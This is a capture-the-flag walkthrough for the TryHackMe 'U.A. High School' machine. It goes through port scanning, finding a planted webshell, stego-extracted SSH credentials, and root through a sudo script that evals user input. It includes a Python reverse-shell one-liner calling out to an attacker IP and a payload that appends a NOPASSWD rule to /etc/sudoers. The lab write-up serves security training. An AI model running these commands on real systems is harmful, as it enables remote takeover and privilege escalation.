---
description: >-
  A complete walkthrough for the TryHackMe machine "U.A. High School". This
  report covers the full chain of exploitation from initial reconnaissance to
  gaining root access.
---

# U.A. High School

## Reconnaissance

So lets start with rustscan&#x20;

```bash
rustscan -a 10.201.118.79 -b 500 -t 500 -- -A -sC -sV
```

```bash
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Because every port has a story to tell.

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 2147483484'.
Open 10.201.118.79:22
Open 10.201.118.79:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sC -sV" on ip 10.201.118.79
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 14:10 UTC
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:10
Completed NSE at 14:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:10
Completed NSE at 14:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:10
Completed NSE at 14:10, 0.00s elapsed
Initiating Ping Scan at 14:10
Scanning 10.201.118.79 [2 ports]
Completed Ping Scan at 14:10, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:10
Completed Parallel DNS resolution of 1 host. at 14:10, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:10
Scanning 10.201.118.79 [2 ports]
Discovered open port 22/tcp on 10.201.118.79
Discovered open port 80/tcp on 10.201.118.79
Completed Connect Scan at 14:10, 0.19s elapsed (2 total ports)
Initiating Service scan at 14:10
Scanning 2 services on 10.201.118.79
Completed Service scan at 14:11, 6.52s elapsed (2 services on 1 host)
NSE: Script scanning 10.201.118.79.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:11
Completed NSE at 14:11, 6.32s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:11
Completed NSE at 14:11, 0.79s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:11
Completed NSE at 14:11, 0.00s elapsed
Nmap scan report for 10.201.118.79
Host is up, received conn-refused (0.19s latency).
Scanned at 2025-10-19 14:10:55 UTC for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6a:75:a9:ae:67:85:0e:51:63:76:51:f4:8a:91:54:a5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVHI4KBIk/xR7psnZs7G9tlWQ6rjvFJhxWISNLeG7zly4pWv2FbU3uoqLCTuK3ODRmlHnF+MunaSypMRnyFqCn1sS2btbyLt88qclkdbkczDjOPzJeFzvDvfD52lnIQMcJ7Ih8KTkIMRLPBDw/jxGPuVyptsvfWCgDBW5eD6e62d+M1yN43+h5HePhN8JWycGLNmXA7ggisKJucGw+ILHcGw/22HFL1dV4KQ2Ox/g15AzZG87WJtnWf1k3SgLHp94VLQLZPN3yEu9DU4IGb4JJ7PCqJ3WxW0inYH9akflduwaDB3TPPFbebsyPzpMSgFI765qidLnAdSMAifeniyTGJqPnyStBkrFxilv//qPAEXHMyvN6rsgQdYgS3g9k6XqcLA8rFSngs3qrAm5RWRtUXlVa+yVvUw8R9oytBLfkNph8YAWONA6raqSUapSqB1yLhPWy0mOAfYg7dRtAG9IC7uiC7jgjZaDyac7HOMluHNI9kL4UqpZQ1clyu4Ow1Kc=
|   256 f3:99:2a:04:fe:3c:17:b5:2a:4f:40:c1:75:55:87:5a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHbNOHfdtNNqGa9gSfVKCdd4jAsxnrn5+71AXqdlO7PB5/sttb/GMQ6yIqx+Ej0Wcwah6Dtxvgref+7zHg1vpK8=
|   256 20:74:9f:8b:7d:a4:97:90:72:05:4c:bc:39:d4:c7:8e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH5SoM52OYrEnDQ9dafpSF7W2le45CtAUB/bfku1eVsU

80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: U.A. High School
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:11
Completed NSE at 14:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:11
Completed NSE at 14:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:11
Completed NSE at 14:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
```

found 2 ports open port 22 and port 80 so lets start with visiting the website on port 80

## Enumeration

Exploring the website did not found anything interesting&#x20;

so there might be hidden directories , lets find them using dirsearch&#x20;

```bash
dirsearch -u 10.201.118.79 
```

```bash
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/Eth3real/thm/UA_high_school/reports/_10.201.118.79/_25-10-19_19-57-16.txt

Target: http://10.201.118.79/

[19:57:17] Starting: 
[19:57:29] 403 -  278B  - /.ht_wsr.txt                                      
[19:57:29] 403 -  278B  - /.htaccess.bak1                                   
[19:57:29] 403 -  278B  - /.htaccess.orig                                   
[19:57:29] 403 -  278B  - /.htaccess.sample
[19:57:29] 403 -  278B  - /.htaccess.save
[19:57:29] 403 -  278B  - /.htaccess_extra                                  
[19:57:29] 403 -  278B  - /.htaccess_orig
[19:57:29] 403 -  278B  - /.htaccess_sc
[19:57:29] 403 -  278B  - /.htaccessBAK
[19:57:29] 403 -  278B  - /.htaccessOLD
[19:57:29] 403 -  278B  - /.htaccessOLD2                                    
[19:57:29] 403 -  278B  - /.htm                                             
[19:57:29] 403 -  278B  - /.html                                            
[19:57:29] 403 -  278B  - /.httr-oauth                                      
[19:57:29] 403 -  278B  - /.htpasswds                                       
[19:57:29] 403 -  278B  - /.htpasswd_test
[19:57:33] 403 -  278B  - /.php                                             
[19:57:44] 200 -    1KB - /about.html                                       
[19:58:08] 301 -  315B  - /assets  ->  http://10.201.118.79/assets/         
[19:58:08] 200 -    0B  - /assets/                                          
[19:58:19] 200 -  924B  - /contact.html                                     
[19:59:09] 403 -  278B  - /server-status/                                   
[19:59:09] 403 -  278B  - /server-status                                    
                                                                             
Task Completed
```

We only found assets so lets see running gobuster on `/assets` endpoint

```bash
gobuster dir -u http://10.201.118.79/assets/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,js
```

```bash
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.118.79/assets/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,js,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 0]
/images               (Status: 301) [Size: 322] [--> http://10.201.118.79/assets/images/]

```

Interesting we found images directory but unfortunately forbidden (403 status code)

<figure><img src="../../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

running the dirsearch again on index.php found webshell!

```bash
dirsearch -u 10.201.118.79/assets/index.php   
```

```bash
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                                                                                                             
                                                                                                                                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/Eth3real/thm/UA_high_school/reports/_10.201.118.79/_assets_index.php_25-10-19_20-29-54.txt

Target: http://10.201.118.79/

[20:29:54] Starting: assets/index.php/                                                                                                                                                              
[20:30:01] 404 -  275B  - /assets/index.php/%2e%2e//google.com              
[20:31:29] 200 -   40B  - /assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir
                                                                             
Task Completed      
```

## Exploitation

<figure><img src="../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

seems like base64 , decoding it we can see the same images directory which we found in gobusters output

```bash
echo "aW1hZ2VzCWluZGV4LnBocCAgc3R5bGVzLmNzcwo=" | base64 -d
images  index.php  styles.css
```

further Enumeration in /images directory found two images <br>

<figure><img src="../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

```bash
echo "dG90YWwgMzM2CmRyd3hyd3hyLXggMiB3d3ctZGF0YSB3d3ctZGF0YSAgIDQwOTYgSnVsICA5ICAyMDIzIC4KZHJ3eHJ3eHIteCAzIHd3dy1kYXRhIHd3dy1kYXRhICAgNDA5NiBKYW4gMjUgIDIwMjQgLi4KLXJ3LXJ3LXItLSAxIHd3dy1kYXRhIHd3dy1kYXRhICA5ODI2NCBKdWwgIDkgIDIwMjMgb25lZm9yYWxsLmpwZwotcnctcnctci0tIDEgd3d3LWRhdGEgd3d3LWRhdGEgMjM3MTcwIEp1bCAgOSAgMjAyMyB5dWVpLmpwZwo=" | base64 -d
total 336
drwxrwxr-x 2 www-data www-data   4096 Jul  9  2023 .
drwxrwxr-x 3 www-data www-data   4096 Jan 25  2024 ..
-rw-rw-r-- 1 www-data www-data  98264 Jul  9  2023 oneforall.jpg
-rw-rw-r-- 1 www-data www-data 237170 Jul  9  2023 yuei.jpg
                                                            
```

lets get those images onto our local machine using wget&#x20;

<figure><img src="../../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

opening the image oneforall.jpg we can see an error message "file starts with 0x89 0x50"

<figure><img src="../../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

simply searching on google we can see that file extension .PNG starts with 0x89 0x50

<figure><img src="../../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

so lets rename it too .png&#x20;

<figure><img src="../../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

but it did not work but the ending sequence says `ffd9` which is .jpg file ending so lets research again on file extension magic numbers&#x20;

Reference :&#x20;

{% embed url="https://en.wikipedia.org/wiki/List_of_file_signatures" %}

<figure><img src="../../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

editing the first 8 bytes to `FF D8 FF E0 00 10 4A 46` in hexedit we can now see the image.

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

I tried stegseek on both the images but seems like we cannot get anything this way&#x20;

so lets get the reverse shell payload used :&#x20;

```bash
export RHOST="10.17.30.9";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

<figure><img src="../../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

found this Hidden\_Content and got the passphrase.txt

<figure><img src="../../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

But whose password is this ? and where can we use this ?\
after trying this password everywhere got creds.txt

```bash
steghide extract -sf oneforall.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".
```

```bash
cat creds.txt    
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

we got the creds lets login it with SSH&#x20;

```bash
deku@ip-10-201-81-47:~$ ls
user.txt
deku@ip-10-201-81-47:~$ cat user.txt
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
```

What is the user.txt flag? : `THM{W3lC0m3_D3kU_1A_0n3f0rAll??}`

## Privilege Escalation

First lets find out what all commands can we execute using sudo

```bash
deku@ip-10-201-81-47:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on ip-10-201-81-47:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on ip-10-201-81-47:
    (ALL) /opt/NewComponent/feedback.sh
```

lets check the content of feedback.sh

<pre class="language-bash"><code class="lang-bash">deku@ip-10-201-44-184:~$ cat /opt/NewComponent/feedback.sh 
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if <a data-footnote-ref href="#user-content-fn-1">[[ "$feedback" != *"\`"* &#x26;&#x26; "$feedback" != *")"* &#x26;&#x26; "$feedback" != *"\$("* &#x26;&#x26; "$feedback" != *"|"* &#x26;&#x26; "$feedback" != *"&#x26;"* &#x26;&#x26; "$feedback" != *";"* &#x26;&#x26; "$feedback" != *"?"* &#x26;&#x26; "$feedback" != *"!"* &#x26;&#x26; "$feedback" != *"\\"* ]]</a>; then
    echo "It is This:"
    <a data-footnote-ref href="#user-content-fn-2">eval "echo $feedback"</a>

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
</code></pre>

VULNERABLE LINE : `eval "echo $feedback"`

we can edit the `/etc/suders` file to NOPASSWD and get the root&#x20;

command : `deku ALL= NOPASSWD: ALL >> /etc/sudoers`

```bash
deku@ip-10-201-44-184:~$ sudo /opt/NewComponent/feedback.sh 
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
deku ALL= NOPASSWD: ALL >> /etc/sudoers
It is This:
Feedback successfully saved.
```

lets check if it worked using `sudo -l`&#x20;

<pre class="language-bash"><code class="lang-bash">deku@ip-10-201-44-184:~$ sudo -l
Matching Defaults entries for deku on ip-10-201-44-184:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on ip-10-201-44-184:
    (ALL) /opt/NewComponent/feedback.sh
    <a data-footnote-ref href="#user-content-fn-3">(root) NOPASSWD: ALL</a>
</code></pre>

lets do `sudo su` and cat that flag out&#x20;

```bash
deku@ip-10-201-44-184:~$ sudo su
root@ip-10-201-44-184:/home/deku# cd
root@ip-10-201-44-184:~# cat root.txt 
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _ 
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 

THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
```

What is the root.txt flag? : `THM{Y0U_4r3_7h3_NUm83r_1_H3r0}`

Thankyou for reading 😊

[^1]: Blacklisting of Symbols need to find a way to exploit this without getting triggered

[^2]: VULNERABLE

[^3]: We can now run commands as root without needing to enter password
